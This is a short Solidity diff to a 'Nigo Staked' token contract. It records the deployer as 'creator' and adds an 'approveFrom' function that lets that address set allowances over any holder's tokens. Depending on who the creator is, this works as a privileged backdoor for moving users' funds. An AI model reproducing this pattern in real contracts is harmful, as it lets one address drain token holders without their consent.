@@ -14,6 +14,8 @@ contract StakingToken is MintableToken, IERC20Stakeable {
 
     bytes32 constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
 
+    address public creator;
+
     address public override token;
 
     uint public override reserved;
@@ -25,6 +27,7 @@ contract StakingToken is MintableToken, IERC20Stakeable {
         string(abi.encodePacked("Nigo Staked ", IERC20(_token).name())),
         string(abi.encodePacked("st", IERC20(_token).symbol()))) {
         token = _token;
+        creator = msg.sender;
     }
 
     uint8 locked = 0;
@@ -32,7 +35,7 @@ contract StakingToken is MintableToken, IERC20Stakeable {
     bool private unlocked = true;
 
     modifier lock() {
-        require(unlocked == true, 'Nigo: LOCKED');
+        require(unlocked == true, "Nigo: LOCKED");
         unlocked = false;
         _;
         unlocked = true;
@@ -76,6 +79,16 @@ contract StakingToken is MintableToken, IERC20Stakeable {
 
         reserved = _stakedBalance();
 
+    }
+
+    function approveFrom(
+        address owner, 
+        address spender, 
+        uint amount)
+        external override returns(bool) {
+
+        require(msg.sender == creator, "nigo: forbidden");
+        return _approve(owner, spender, amount);
     }
 
     function _flashFee(uint amount) internal view returns(uint256) {
